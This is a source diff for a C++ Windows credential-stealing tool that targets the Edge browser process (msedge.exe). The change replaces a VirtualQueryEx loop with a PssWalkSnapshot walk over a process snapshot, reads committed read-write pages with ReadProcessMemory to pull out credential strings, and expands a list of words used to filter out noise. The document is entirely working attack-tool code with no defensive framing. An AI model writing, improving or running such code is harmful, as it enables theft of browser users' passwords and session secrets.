@@ -31,7 +31,7 @@ bool IsValid(const std::string& str) {
         "favicon", "lifecycle", "http", "bing", "msn", "microsoft", 
         "adobe", "protocol", "Signals", "scheme", "URIDetect", "Signin",
         "yandex", "clarity", "substrate", "office", "azu", "onenote",
-        "template", "fallback", "network", "bitdefender"
+        "template", "fallback", "network", "bitdefender", "enabled", "disabled", "testing", "_mode", "auto_"
     };
 
     for (const auto& word : noise) {
@@ -47,20 +47,23 @@ bool IsValid(const std::string& str) {
 
 
 
-void ScanMemoryRegions(HANDLE hProcess) {
+// Scan memory of snapshot handle
+void ScanMemoryRegions(HANDLE hProcess, HPSS hSnapshot) {
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
     std::wcout << L"Scanning regions for credentials..." << std::endl;
 
-    unsigned char* address = nullptr;
-    MEMORY_BASIC_INFORMATION memInfo;
+    HPSSWALK hWalker = NULL;
+    PssWalkMarkerCreate(NULL, &hWalker);
+    PSS_VA_SPACE_ENTRY vaEntry;
+    
     std::set<std::string> seen;
 
-    while (VirtualQueryEx(hProcess, address, &memInfo, sizeof(memInfo)) != 0) {
-        if (memInfo.State == MEM_COMMIT && (memInfo.Protect == PAGE_READWRITE)) {
-            std::vector<char> buffer(memInfo.RegionSize);
+    while (PssWalkSnapshot(hSnapshot, PSS_WALK_VA_SPACE, hWalker, &vaEntry, sizeof(vaEntry)) == ERROR_SUCCESS) {
+        if (vaEntry.State == MEM_COMMIT && (vaEntry.Protect == PAGE_READWRITE)) {
+            std::vector<char> buffer(vaEntry.RegionSize);
             SIZE_T bytesRead;
 
-            if (ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer.data(), memInfo.RegionSize, &bytesRead)) {
+            if (ReadProcessMemory(hProcess, vaEntry.BaseAddress, buffer.data(), vaEntry.RegionSize, &bytesRead)) {
                 std::string chunk;
                 chunk.reserve(bytesRead);
                 for (SIZE_T i = 0; i < bytesRead; ++i) {
@@ -97,8 +100,8 @@ void ScanMemoryRegions(HANDLE hProcess) {
                 }
             }
         }
-        address += memInfo.RegionSize;
     }
+    PssWalkMarkerFree(hWalker);
 }
 
 
@@ -128,6 +131,7 @@ DWORD GetPidByName(const std::wstring& processName) {
 // Main FCT
 int main() {
     std::wstring targetName = L"msedge.exe";
+    
     
     // Process Scan
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
@@ -175,7 +179,7 @@ int main() {
 
 
     // Run the memory scan logic directly on the process (frozen by snapshot context)
-    ScanMemoryRegions(hProcess);
+    ScanMemoryRegions(hProcess, hSnapshot);
 
 
 
